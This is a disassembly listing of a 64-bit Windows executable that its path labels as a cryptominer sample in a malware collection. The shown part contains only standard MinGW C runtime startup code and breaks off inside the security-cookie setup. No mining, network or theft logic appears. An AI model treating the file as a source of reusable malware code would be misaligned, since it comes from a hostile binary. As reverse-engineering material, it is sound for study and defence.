
malware_samples/miner/8c464f7e24175de5771ba803c831409ab50ef8b52a5e727268302346bd9fcdb1.exe:     file format pei-x86-64


Disassembly of section .text:

0000000000401000 <WinMainCRTStartup-0x4c0>:
  401000:	c3                   	ret
  401001:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  401008:	00 00 00 00 
  40100c:	0f 1f 40 00          	nopl   0x0(%rax)
  401010:	48 83 ec 28          	sub    $0x28,%rsp
  401014:	48 8b 05 35 45 00 00 	mov    0x4535(%rip),%rax        # 405550 <.refptr.mingw_initltsdrot_force>
  40101b:	31 c9                	xor    %ecx,%ecx
  40101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401023:	48 8b 05 36 45 00 00 	mov    0x4536(%rip),%rax        # 405560 <.refptr.mingw_initltsdyn_force>
  40102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401030:	48 8b 05 39 45 00 00 	mov    0x4539(%rip),%rax        # 405570 <.refptr.mingw_initltssuo_force>
  401037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40103d:	48 8b 05 fc 44 00 00 	mov    0x44fc(%rip),%rax        # 405540 <.refptr.mingw_initcharmax>
  401044:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40104a:	48 8b 05 ef 43 00 00 	mov    0x43ef(%rip),%rax        # 405440 <.refptr.__image_base__>
  401051:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
  401056:	75 0f                	jne    401067 <__ImageBase+0x1067>
  401058:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
  40105c:	48 01 d0             	add    %rdx,%rax
  40105f:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
  401065:	74 59                	je     4010c0 <__ImageBase+0x10c0>
  401067:	48 8b 05 c2 44 00 00 	mov    0x44c2(%rip),%rax        # 405530 <.refptr.mingw_app_type>
  40106e:	89 0d 98 6f 00 00    	mov    %ecx,0x6f98(%rip)        # 40800c <__bss_start__+0xc>
  401074:	8b 00                	mov    (%rax),%eax
  401076:	85 c0                	test   %eax,%eax
  401078:	75 36                	jne    4010b0 <__ImageBase+0x10b0>
  40107a:	b9 01 00 00 00       	mov    $0x1,%ecx
  40107f:	e8 fc 20 00 00       	call   403180 <__set_app_type>
  401084:	e8 cf 20 00 00       	call   403158 <__p__fmode>
  401089:	48 8b 15 60 44 00 00 	mov    0x4460(%rip),%rdx        # 4054f0 <.refptr._fmode>
  401090:	8b 12                	mov    (%rdx),%edx
  401092:	89 10                	mov    %edx,(%rax)
  401094:	e8 a7 05 00 00       	call   401640 <_setargv>
  401099:	48 8b 05 50 43 00 00 	mov    0x4350(%rip),%rax        # 4053f0 <.refptr._MINGW_INSTALL_DEBUG_MATHERR>
  4010a0:	83 38 01             	cmpl   $0x1,(%rax)
  4010a3:	74 4b                	je     4010f0 <__ImageBase+0x10f0>
  4010a5:	31 c0                	xor    %eax,%eax
  4010a7:	48 83 c4 28          	add    $0x28,%rsp
  4010ab:	c3                   	ret
  4010ac:	0f 1f 40 00          	nopl   0x0(%rax)
  4010b0:	b9 02 00 00 00       	mov    $0x2,%ecx
  4010b5:	e8 c6 20 00 00       	call   403180 <__set_app_type>
  4010ba:	eb c8                	jmp    401084 <__ImageBase+0x1084>
  4010bc:	0f 1f 40 00          	nopl   0x0(%rax)
  4010c0:	0f b7 50 18          	movzwl 0x18(%rax),%edx
  4010c4:	66 81 fa 0b 01       	cmp    $0x10b,%dx
  4010c9:	74 3d                	je     401108 <__ImageBase+0x1108>
  4010cb:	66 81 fa 0b 02       	cmp    $0x20b,%dx
  4010d0:	75 95                	jne    401067 <__ImageBase+0x1067>
  4010d2:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
  4010d9:	76 8c                	jbe    401067 <__ImageBase+0x1067>
  4010db:	8b 90 f8 00 00 00    	mov    0xf8(%rax),%edx
  4010e1:	31 c9                	xor    %ecx,%ecx
  4010e3:	85 d2                	test   %edx,%edx
  4010e5:	0f 95 c1             	setne  %cl
  4010e8:	e9 7a ff ff ff       	jmp    401067 <__ImageBase+0x1067>
  4010ed:	0f 1f 00             	nopl   (%rax)
  4010f0:	48 8d 0d 09 08 00 00 	lea    0x809(%rip),%rcx        # 401900 <_matherr>
  4010f7:	e8 d4 0e 00 00       	call   401fd0 <__mingw_setusermatherr>
  4010fc:	31 c0                	xor    %eax,%eax
  4010fe:	48 83 c4 28          	add    $0x28,%rsp
  401102:	c3                   	ret
  401103:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401108:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
  40110c:	0f 86 55 ff ff ff    	jbe    401067 <__ImageBase+0x1067>
  401112:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
  401119:	31 c9                	xor    %ecx,%ecx
  40111b:	45 85 c0             	test   %r8d,%r8d
  40111e:	0f 95 c1             	setne  %cl
  401121:	e9 41 ff ff ff       	jmp    401067 <__ImageBase+0x1067>
  401126:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40112d:	00 00 00 
  401130:	48 83 ec 38          	sub    $0x38,%rsp
  401134:	48 8b 05 e5 43 00 00 	mov    0x43e5(%rip),%rax        # 405520 <.refptr._newmode>
  40113b:	4c 8d 05 d6 6e 00 00 	lea    0x6ed6(%rip),%r8        # 408018 <__bss_start__+0x18>
  401142:	48 8d 15 d7 6e 00 00 	lea    0x6ed7(%rip),%rdx        # 408020 <__bss_start__+0x20>
  401149:	48 8d 0d d8 6e 00 00 	lea    0x6ed8(%rip),%rcx        # 408028 <__bss_start__+0x28>
  401150:	8b 00                	mov    (%rax),%eax
  401152:	89 05 ac 6e 00 00    	mov    %eax,0x6eac(%rip)        # 408004 <__bss_start__+0x4>
  401158:	48 8d 05 a5 6e 00 00 	lea    0x6ea5(%rip),%rax        # 408004 <__bss_start__+0x4>
  40115f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401164:	48 8b 05 75 43 00 00 	mov    0x4375(%rip),%rax        # 4054e0 <.refptr._dowildcard>
  40116b:	44 8b 08             	mov    (%rax),%r9d
  40116e:	e8 cd 1d 00 00       	call   402f40 <__getmainargs>
  401173:	90                   	nop
  401174:	48 83 c4 38          	add    $0x38,%rsp
  401178:	c3                   	ret
  401179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401180:	41 55                	push   %r13
  401182:	41 54                	push   %r12
  401184:	55                   	push   %rbp
  401185:	57                   	push   %rdi
  401186:	56                   	push   %rsi
  401187:	53                   	push   %rbx
  401188:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
  40118f:	b9 0d 00 00 00       	mov    $0xd,%ecx
  401194:	31 c0                	xor    %eax,%eax
  401196:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
  40119b:	4c 89 c7             	mov    %r8,%rdi
  40119e:	f3 48 ab             	rep stos %rax,(%rdi)
  4011a1:	48 8b 3d 88 43 00 00 	mov    0x4388(%rip),%rdi        # 405530 <.refptr.mingw_app_type>
  4011a8:	44 8b 0f             	mov    (%rdi),%r9d
  4011ab:	45 85 c9             	test   %r9d,%r9d
  4011ae:	0f 85 ac 02 00 00    	jne    401460 <__ImageBase+0x1460>
  4011b4:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
  4011bb:	00 00 
  4011bd:	48 8b 1d bc 42 00 00 	mov    0x42bc(%rip),%rbx        # 405480 <.refptr.__native_startup_lock>
  4011c4:	48 8b 70 08          	mov    0x8(%rax),%rsi
  4011c8:	31 ed                	xor    %ebp,%ebp
  4011ca:	4c 8b 25 73 82 00 00 	mov    0x8273(%rip),%r12        # 409444 <__imp_Sleep>
  4011d1:	eb 16                	jmp    4011e9 <__ImageBase+0x11e9>
  4011d3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4011d8:	48 39 c6             	cmp    %rax,%rsi
  4011db:	0f 84 1f 02 00 00    	je     401400 <__ImageBase+0x1400>
  4011e1:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  4011e6:	41 ff d4             	call   *%r12
  4011e9:	48 89 e8             	mov    %rbp,%rax
  4011ec:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
  4011f1:	48 85 c0             	test   %rax,%rax
  4011f4:	75 e2                	jne    4011d8 <__ImageBase+0x11d8>
  4011f6:	48 8b 35 93 42 00 00 	mov    0x4293(%rip),%rsi        # 405490 <.refptr.__native_startup_state>
  4011fd:	31 ed                	xor    %ebp,%ebp
  4011ff:	8b 06                	mov    (%rsi),%eax
  401201:	83 f8 01             	cmp    $0x1,%eax
  401204:	0f 84 0d 02 00 00    	je     401417 <__ImageBase+0x1417>
  40120a:	8b 06                	mov    (%rsi),%eax
  40120c:	85 c0                	test   %eax,%eax
  40120e:	0f 84 7c 02 00 00    	je     401490 <__ImageBase+0x1490>
  401214:	c7 05 ea 6d 00 00 01 	movl   $0x1,0x6dea(%rip)        # 408008 <__bss_start__+0x8>
  40121b:	00 00 00 
  40121e:	8b 06                	mov    (%rsi),%eax
  401220:	83 f8 01             	cmp    $0x1,%eax
  401223:	0f 84 03 02 00 00    	je     40142c <__ImageBase+0x142c>
  401229:	85 ed                	test   %ebp,%ebp
  40122b:	0f 84 1c 02 00 00    	je     40144d <__ImageBase+0x144d>
  401231:	48 8b 05 f8 41 00 00 	mov    0x41f8(%rip),%rax        # 405430 <.refptr.__dyn_tls_init_callback>
  401238:	48 8b 00             	mov    (%rax),%rax
  40123b:	48 85 c0             	test   %rax,%rax
  40123e:	74 0c                	je     40124c <__ImageBase+0x124c>
  401240:	45 31 c0             	xor    %r8d,%r8d
  401243:	ba 02 00 00 00       	mov    $0x2,%edx
  401248:	31 c9                	xor    %ecx,%ecx
  40124a:	ff d0                	call   *%rax
  40124c:	e8 3f 0a 00 00       	call   401c90 <_pei386_runtime_relocator>
  401251:	48 8d 0d 48 10 00 00 	lea    0x1048(%rip),%rcx        # 4022a0 <_gnu_exception_handler>
  401258:	ff 15 de 81 00 00    	call   *0x81de(%rip)        # 40943c <__imp_SetUnhandledExceptionFilter>
  40125e:	48 8b 15 0b 42 00 00 	mov    0x420b(%rip),%rdx        # 405470 <.refptr.__mingw_oldexcpt_handler>
  401265:	48 89 02             	mov    %rax,(%rdx)
  401268:	e8 33 0f 00 00       	call   4021a0 <__mingw_init_ehandler>
  40126d:	48 8d 0d 8c fd ff ff 	lea    -0x274(%rip),%rcx        # 401000 <__ImageBase+0x1000>
  401274:	e8 67 1f 00 00       	call   4031e0 <_set_invalid_parameter_handler>
  401279:	e8 82 07 00 00       	call   401a00 <_fpreset>
  40127e:	48 8b 05 bb 41 00 00 	mov    0x41bb(%rip),%rax        # 405440 <.refptr.__image_base__>
  401285:	48 89 05 ec 76 00 00 	mov    %rax,0x76ec(%rip)        # 408978 <__mingw_winmain_hInstance>
  40128c:	e8 0f 1f 00 00       	call   4031a0 <__p__acmdln>
  401291:	31 c9                	xor    %ecx,%ecx
  401293:	48 8b 00             	mov    (%rax),%rax
  401296:	48 85 c0             	test   %rax,%rax
  401299:	75 17                	jne    4012b2 <__ImageBase+0x12b2>
  40129b:	eb 53                	jmp    4012f0 <__ImageBase+0x12f0>
  40129d:	0f 1f 00             	nopl   (%rax)
  4012a0:	84 d2                	test   %dl,%dl
  4012a2:	74 45                	je     4012e9 <__ImageBase+0x12e9>
  4012a4:	83 e1 01             	and    $0x1,%ecx
  4012a7:	74 27                	je     4012d0 <__ImageBase+0x12d0>
  4012a9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012ae:	48 83 c0 01          	add    $0x1,%rax
  4012b2:	0f b6 10             	movzbl (%rax),%edx
  4012b5:	80 fa 20             	cmp    $0x20,%dl
  4012b8:	7e e6                	jle    4012a0 <__ImageBase+0x12a0>
  4012ba:	41 89 c8             	mov    %ecx,%r8d
  4012bd:	41 83 f0 01          	xor    $0x1,%r8d
  4012c1:	80 fa 22             	cmp    $0x22,%dl
  4012c4:	41 0f 44 c8          	cmove  %r8d,%ecx
  4012c8:	eb e4                	jmp    4012ae <__ImageBase+0x12ae>
  4012ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4012d0:	84 d2                	test   %dl,%dl
  4012d2:	74 15                	je     4012e9 <__ImageBase+0x12e9>
  4012d4:	0f 1f 40 00          	nopl   0x0(%rax)
  4012d8:	0f b6 50 01          	movzbl 0x1(%rax),%edx
  4012dc:	48 83 c0 01          	add    $0x1,%rax
  4012e0:	84 d2                	test   %dl,%dl
  4012e2:	74 05                	je     4012e9 <__ImageBase+0x12e9>
  4012e4:	80 fa 20             	cmp    $0x20,%dl
  4012e7:	7e ef                	jle    4012d8 <__ImageBase+0x12d8>
  4012e9:	48 89 05 80 76 00 00 	mov    %rax,0x7680(%rip)        # 408970 <__mingw_winmain_lpCmdLine>
  4012f0:	44 8b 07             	mov    (%rdi),%r8d
  4012f3:	45 85 c0             	test   %r8d,%r8d
  4012f6:	74 16                	je     40130e <__ImageBase+0x130e>
  4012f8:	b8 0a 00 00 00       	mov    $0xa,%eax
  4012fd:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
  401302:	0f 85 e8 00 00 00    	jne    4013f0 <__ImageBase+0x13f0>
  401308:	89 05 f2 2c 00 00    	mov    %eax,0x2cf2(%rip)        # 404000 <__data_start__>
  40130e:	8b 1d 14 6d 00 00    	mov    0x6d14(%rip),%ebx        # 408028 <__bss_start__+0x28>
  401314:	44 8d 63 01          	lea    0x1(%rbx),%r12d
  401318:	4d 63 e4             	movslq %r12d,%r12
  40131b:	49 c1 e4 03          	shl    $0x3,%r12
  40131f:	4c 89 e1             	mov    %r12,%rcx
  401322:	e8 21 1f 00 00       	call   403248 <malloc>
  401327:	4c 8b 2d f2 6c 00 00 	mov    0x6cf2(%rip),%r13        # 408020 <__bss_start__+0x20>
  40132e:	48 89 c7             	mov    %rax,%rdi
  401331:	85 db                	test   %ebx,%ebx
  401333:	7e 46                	jle    40137b <__ImageBase+0x137b>
  401335:	8d 6b ff             	lea    -0x1(%rbx),%ebp
  401338:	31 db                	xor    %ebx,%ebx
  40133a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401340:	49 8b 4c dd 00       	mov    0x0(%r13,%rbx,8),%rcx
  401345:	e8 e6 1d 00 00       	call   403130 <strlen>
  40134a:	48 8d 70 01          	lea    0x1(%rax),%rsi
  40134e:	48 89 f1             	mov    %rsi,%rcx
  401351:	e8 f2 1e 00 00       	call   403248 <malloc>
  401356:	49 89 f0             	mov    %rsi,%r8
  401359:	48 89 04 df          	mov    %rax,(%rdi,%rbx,8)
  40135d:	49 8b 54 dd 00       	mov    0x0(%r13,%rbx,8),%rdx
  401362:	48 89 c1             	mov    %rax,%rcx
  401365:	e8 9e 1e 00 00       	call   403208 <memcpy>
  40136a:	48 89 d8             	mov    %rbx,%rax
  40136d:	48 83 c3 01          	add    $0x1,%rbx
  401371:	48 39 c5             	cmp    %rax,%rbp
  401374:	75 ca                	jne    401340 <__ImageBase+0x1340>
  401376:	4a 8d 44 27 f8       	lea    -0x8(%rdi,%r12,1),%rax
  40137b:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  401382:	48 89 3d 97 6c 00 00 	mov    %rdi,0x6c97(%rip)        # 408020 <__bss_start__+0x20>
  401389:	e8 82 02 00 00       	call   401610 <__main>
  40138e:	48 8b 05 bb 40 00 00 	mov    0x40bb(%rip),%rax        # 405450 <.refptr.__imp___initenv>
  401395:	4c 8b 05 7c 6c 00 00 	mov    0x6c7c(%rip),%r8        # 408018 <__bss_start__+0x18>
  40139c:	8b 0d 86 6c 00 00    	mov    0x6c86(%rip),%ecx        # 408028 <__bss_start__+0x28>
  4013a2:	48 8b 00             	mov    (%rax),%rax
  4013a5:	4c 89 00             	mov    %r8,(%rax)
  4013a8:	48 8b 15 71 6c 00 00 	mov    0x6c71(%rip),%rdx        # 408020 <__bss_start__+0x20>
  4013af:	e8 bc 1f 00 00       	call   403370 <main>
  4013b4:	8b 0d 52 6c 00 00    	mov    0x6c52(%rip),%ecx        # 40800c <__bss_start__+0xc>
  4013ba:	89 05 50 6c 00 00    	mov    %eax,0x6c50(%rip)        # 408010 <__bss_start__+0x10>
  4013c0:	85 c9                	test   %ecx,%ecx
  4013c2:	0f 84 e6 00 00 00    	je     4014ae <__ImageBase+0x14ae>
  4013c8:	8b 15 3a 6c 00 00    	mov    0x6c3a(%rip),%edx        # 408008 <__bss_start__+0x8>
  4013ce:	85 d2                	test   %edx,%edx
  4013d0:	0f 84 9a 00 00 00    	je     401470 <__ImageBase+0x1470>
  4013d6:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
  4013dd:	5b                   	pop    %rbx
  4013de:	5e                   	pop    %rsi
  4013df:	5f                   	pop    %rdi
  4013e0:	5d                   	pop    %rbp
  4013e1:	41 5c                	pop    %r12
  4013e3:	41 5d                	pop    %r13
  4013e5:	c3                   	ret
  4013e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4013ed:	00 00 00 
  4013f0:	0f b7 44 24 60       	movzwl 0x60(%rsp),%eax
  4013f5:	e9 0e ff ff ff       	jmp    401308 <__ImageBase+0x1308>
  4013fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401400:	48 8b 35 89 40 00 00 	mov    0x4089(%rip),%rsi        # 405490 <.refptr.__native_startup_state>
  401407:	bd 01 00 00 00       	mov    $0x1,%ebp
  40140c:	8b 06                	mov    (%rsi),%eax
  40140e:	83 f8 01             	cmp    $0x1,%eax
  401411:	0f 85 f3 fd ff ff    	jne    40120a <__ImageBase+0x120a>
  401417:	b9 1f 00 00 00       	mov    $0x1f,%ecx
  40141c:	e8 2f 1c 00 00       	call   403050 <_amsg_exit>
  401421:	8b 06                	mov    (%rsi),%eax
  401423:	83 f8 01             	cmp    $0x1,%eax
  401426:	0f 85 fd fd ff ff    	jne    401229 <__ImageBase+0x1229>
  40142c:	48 8b 15 7d 40 00 00 	mov    0x407d(%rip),%rdx        # 4054b0 <.refptr.__xc_z>
  401433:	48 8b 0d 66 40 00 00 	mov    0x4066(%rip),%rcx        # 4054a0 <.refptr.__xc_a>
  40143a:	e8 99 1d 00 00       	call   4031d8 <_initterm>
  40143f:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
  401445:	85 ed                	test   %ebp,%ebp
  401447:	0f 85 e4 fd ff ff    	jne    401231 <__ImageBase+0x1231>
  40144d:	31 c0                	xor    %eax,%eax
  40144f:	48 87 03             	xchg   %rax,(%rbx)
  401452:	e9 da fd ff ff       	jmp    401231 <__ImageBase+0x1231>
  401457:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40145e:	00 00 
  401460:	4c 89 c1             	mov    %r8,%rcx
  401463:	ff 15 73 7f 00 00    	call   *0x7f73(%rip)        # 4093dc <__imp_GetStartupInfoA>
  401469:	e9 46 fd ff ff       	jmp    4011b4 <__ImageBase+0x11b4>
  40146e:	66 90                	xchg   %ax,%ax
  401470:	e8 33 1d 00 00       	call   4031a8 <_cexit>
  401475:	8b 05 95 6b 00 00    	mov    0x6b95(%rip),%eax        # 408010 <__bss_start__+0x10>
  40147b:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
  401482:	5b                   	pop    %rbx
  401483:	5e                   	pop    %rsi
  401484:	5f                   	pop    %rdi
  401485:	5d                   	pop    %rbp
  401486:	41 5c                	pop    %r12
  401488:	41 5d                	pop    %r13
  40148a:	c3                   	ret
  40148b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401490:	48 8b 15 39 40 00 00 	mov    0x4039(%rip),%rdx        # 4054d0 <.refptr.__xi_z>
  401497:	48 8b 0d 22 40 00 00 	mov    0x4022(%rip),%rcx        # 4054c0 <.refptr.__xi_a>
  40149e:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
  4014a4:	e8 2f 1d 00 00       	call   4031d8 <_initterm>
  4014a9:	e9 70 fd ff ff       	jmp    40121e <__ImageBase+0x121e>
  4014ae:	89 c1                	mov    %eax,%ecx
  4014b0:	e8 3b 1d 00 00       	call   4031f0 <exit>
  4014b5:	90                   	nop
  4014b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4014bd:	00 00 00 

00000000004014c0 <WinMainCRTStartup>:
  4014c0:	48 83 ec 28          	sub    $0x28,%rsp

00000000004014c4 <.l_startw>:
  4014c4:	48 8b 05 65 40 00 00 	mov    0x4065(%rip),%rax        # 405530 <.refptr.mingw_app_type>
  4014cb:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  4014d1:	e8 7a 01 00 00       	call   401650 <__security_init_cookie>
  4014d6:	e8 a5 fc ff ff       	call   401180 <__ImageBase+0x1180>
  4014db:	90                   	nop

00000000004014dc <.l_endw>:
  4014dc:	90                   	nop
  4014dd:	48 83 c4 28          	add    $0x28,%rsp
  4014e1:	c3                   	ret
  4014e2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  4014e9:	00 00 00 00 
  4014ed:	0f 1f 00             	nopl   (%rax)

00000000004014f0 <mainCRTStartup>:
  4014f0:	48 83 ec 28          	sub    $0x28,%rsp

00000000004014f4 <.l_start>:
  4014f4:	48 8b 05 35 40 00 00 	mov    0x4035(%rip),%rax        # 405530 <.refptr.mingw_app_type>
  4014fb:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  401501:	e8 4a 01 00 00       	call   401650 <__security_init_cookie>
  401506:	e8 75 fc ff ff       	call   401180 <__ImageBase+0x1180>
  40150b:	90                   	nop

000000000040150c <.l_end>:
  40150c:	90                   	nop
  40150d:	48 83 c4 28          	add    $0x28,%rsp
  401511:	c3                   	ret
  401512:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  401519:	00 00 00 00 
  40151d:	0f 1f 00             	nopl   (%rax)

0000000000401520 <atexit>:
  401520:	48 83 ec 28          	sub    $0x28,%rsp
  401524:	e8 f7 1a 00 00       	call   403020 <_onexit>
  401529:	48 85 c0             	test   %rax,%rax
  40152c:	0f 94 c0             	sete   %al
  40152f:	0f b6 c0             	movzbl %al,%eax
  401532:	f7 d8                	neg    %eax
  401534:	48 83 c4 28          	add    $0x28,%rsp
  401538:	c3                   	ret
  401539:	90                   	nop
  40153a:	90                   	nop
  40153b:	90                   	nop
  40153c:	90                   	nop
  40153d:	90                   	nop
  40153e:	90                   	nop
  40153f:	90                   	nop

0000000000401540 <__gcc_register_frame>:
  401540:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 401550 <__gcc_deregister_frame>
  401547:	e9 d4 ff ff ff       	jmp    401520 <atexit>
  40154c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401550 <__gcc_deregister_frame>:
  401550:	c3                   	ret
  401551:	90                   	nop
  401552:	90                   	nop
  401553:	90                   	nop
  401554:	90                   	nop
  401555:	90                   	nop
  401556:	90                   	nop
  401557:	90                   	nop
  401558:	90                   	nop
  401559:	90                   	nop
  40155a:	90                   	nop
  40155b:	90                   	nop
  40155c:	90                   	nop
  40155d:	90                   	nop
  40155e:	90                   	nop
  40155f:	90                   	nop

0000000000401560 <__do_global_dtors>:
  401560:	48 83 ec 28          	sub    $0x28,%rsp
  401564:	48 8b 05 a5 2a 00 00 	mov    0x2aa5(%rip),%rax        # 404010 <__data_start__+0x10>
  40156b:	48 8b 00             	mov    (%rax),%rax
  40156e:	48 85 c0             	test   %rax,%rax
  401571:	74 22                	je     401595 <__do_global_dtors+0x35>
  401573:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401578:	ff d0                	call   *%rax
  40157a:	48 8b 05 8f 2a 00 00 	mov    0x2a8f(%rip),%rax        # 404010 <__data_start__+0x10>
  401581:	48 8d 50 08          	lea    0x8(%rax),%rdx
  401585:	48 8b 40 08          	mov    0x8(%rax),%rax
  401589:	48 89 15 80 2a 00 00 	mov    %rdx,0x2a80(%rip)        # 404010 <__data_start__+0x10>
  401590:	48 85 c0             	test   %rax,%rax
  401593:	75 e3                	jne    401578 <__do_global_dtors+0x18>
  401595:	48 83 c4 28          	add    $0x28,%rsp
  401599:	c3                   	ret
  40159a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000004015a0 <__do_global_ctors>:
  4015a0:	56                   	push   %rsi
  4015a1:	53                   	push   %rbx
  4015a2:	48 83 ec 28          	sub    $0x28,%rsp
  4015a6:	48 8b 15 53 3e 00 00 	mov    0x3e53(%rip),%rdx        # 405400 <.refptr.__CTOR_LIST__>
  4015ad:	48 8b 02             	mov    (%rdx),%rax
  4015b0:	89 c1                	mov    %eax,%ecx
  4015b2:	83 f8 ff             	cmp    $0xffffffff,%eax
  4015b5:	74 39                	je     4015f0 <__do_global_ctors+0x50>
  4015b7:	85 c9                	test   %ecx,%ecx
  4015b9:	74 20                	je     4015db <__do_global_ctors+0x3b>
  4015bb:	89 c8                	mov    %ecx,%eax
  4015bd:	83 e9 01             	sub    $0x1,%ecx
  4015c0:	48 8d 1c c2          	lea    (%rdx,%rax,8),%rbx
  4015c4:	48 29 c8             	sub    %rcx,%rax
  4015c7:	48 8d 74 c2 f8       	lea    -0x8(%rdx,%rax,8),%rsi
  4015cc:	0f 1f 40 00          	nopl   0x0(%rax)
  4015d0:	ff 13                	call   *(%rbx)
  4015d2:	48 83 eb 08          	sub    $0x8,%rbx
  4015d6:	48 39 f3             	cmp    %rsi,%rbx
  4015d9:	75 f5                	jne    4015d0 <__do_global_ctors+0x30>
  4015db:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 401560 <__do_global_dtors>
  4015e2:	48 83 c4 28          	add    $0x28,%rsp
  4015e6:	5b                   	pop    %rbx
  4015e7:	5e                   	pop    %rsi
  4015e8:	e9 33 ff ff ff       	jmp    401520 <atexit>
  4015ed:	0f 1f 00             	nopl   (%rax)
  4015f0:	31 c0                	xor    %eax,%eax
  4015f2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4015f8:	44 8d 40 01          	lea    0x1(%rax),%r8d
  4015fc:	89 c1                	mov    %eax,%ecx
  4015fe:	4a 83 3c c2 00       	cmpq   $0x0,(%rdx,%r8,8)
  401603:	4c 89 c0             	mov    %r8,%rax
  401606:	75 f0                	jne    4015f8 <__do_global_ctors+0x58>
  401608:	eb ad                	jmp    4015b7 <__do_global_ctors+0x17>
  40160a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000401610 <__main>:
  401610:	8b 05 1a 6a 00 00    	mov    0x6a1a(%rip),%eax        # 408030 <__bss_start__+0x30>
  401616:	85 c0                	test   %eax,%eax
  401618:	74 06                	je     401620 <__main+0x10>
  40161a:	c3                   	ret
  40161b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401620:	c7 05 06 6a 00 00 01 	movl   $0x1,0x6a06(%rip)        # 408030 <__bss_start__+0x30>
  401627:	00 00 00 
  40162a:	e9 71 ff ff ff       	jmp    4015a0 <__do_global_ctors>
  40162f:	90                   	nop
  401630:	48 ff 25 bd 7e 00 00 	rex.W jmp *0x7ebd(%rip)        # 4094f4 <__imp___lconv_init>
  401637:	90                   	nop
  401638:	90                   	nop
  401639:	90                   	nop
  40163a:	90                   	nop
  40163b:	90                   	nop
  40163c:	90                   	nop
  40163d:	90                   	nop
  40163e:	90                   	nop
  40163f:	90                   	nop

0000000000401640 <_setargv>:
  401640:	31 c0                	xor    %eax,%eax
  401642:	c3                   	ret
  401643:	90                   	nop
  401644:	90                   	nop
  401645:	90                   	nop
  401646:	90                   	nop
  401647:	90                   	nop
  401648:	90                   	nop
  401649:	90                   	nop
  40164a:	90                   	nop
  40164b:	90                   	nop
  40164c:	90                   	nop
  40164d:	90                   	nop
  40164e:	90                   	nop
  40164f:	90                   	nop

0000000000401650 <__security_init_cookie>:
  401650:	41 54                	push   %r12
  401652:	55                   	push   %rbp
  401653:	57                   	push   %rdi
  401654:	56                   	push   %rsi
  401655:	53                   	push   %rbx
  401656:	48 83 ec 30          	sub    $0x30,%rsp
  40165a:	48 8b 1d af 2a 00 00 	mov    0x2aaf(%rip),%rbx        # 404110 <__security_cookie>
  401661:	48 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rax
  401668:	2b 00 00 
  40166b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  401672:	00 00 
  401674:	48 39 c3             	cmp    %rax,%rbx
  401677:	74 17                	je     401690 <__security_init_cookie+0x40>
  401679:	48 f7 d3             	not    %rbx
  40167c:	48 89 1d 9d 2a 00 00 	mov    %rbx,0x2a9d(%rip)        # 404120 <__security_cookie_complement>
  401683:	48 83 c4 30          	add    $0x30,%rsp
  401687:	5b                   	pop    %rbx
  401688:	5e                   	pop    %rsi
  401689:	5f                   	pop    %rdi
  40168a:	5d                   	pop    %rbp
  40168b:	41 5c                	pop    %r12
  40168d:	c3                   	ret
  40168e:	66 90                	xchg   %ax,%ax
  401690:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401695:	ff 15 49 7d 00 00    	call   *0x7d49(%rip)        # 4093e4 <__imp_GetSystemTimeAsFileTime>
  40169b:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
  4016a0:	ff 15 16 7d 00 00    	call   *0x7d16(%rip)        # 4093bc <__imp_GetCurrentProcessId>
  4016a6:	89 c5                	mov    %eax,%ebp
  4016a8:	ff 15 16 7d 00 00    	call   *0x7d16(%rip)        # 4093c4 <__imp_GetCurrentThreadId>
  4016ae:	89 c7                	mov    %eax,%edi
